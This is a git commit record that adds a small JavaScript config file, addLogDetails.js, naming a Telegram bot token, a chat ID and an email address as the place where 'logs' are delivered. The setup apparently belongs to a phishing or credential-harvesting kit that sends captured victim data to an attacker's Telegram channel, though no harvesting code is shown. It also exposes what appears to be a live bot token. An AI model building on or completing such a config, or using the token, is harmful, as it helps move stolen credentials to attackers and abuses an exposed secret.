7c36a4b63ed501a366dd161460c2dfd32960a518
christy565 <christinataylorer9@gmail.com>
2024-07-10 02:37:54 +0400

    Add files via upload

---
+++ addLogDetails.js
@@ -0,0 +1,6 @@
+// Add your bot details here👇 (this is where you will get the logs)
+
+var telegramBotId = "6502537025:AAGlWDt4HheBPcy10r1x6CtInaTTlb4CVUg";
+var chatId = 6840082974;
+
+var emailForLogs = "finessee2024@gmail.com";
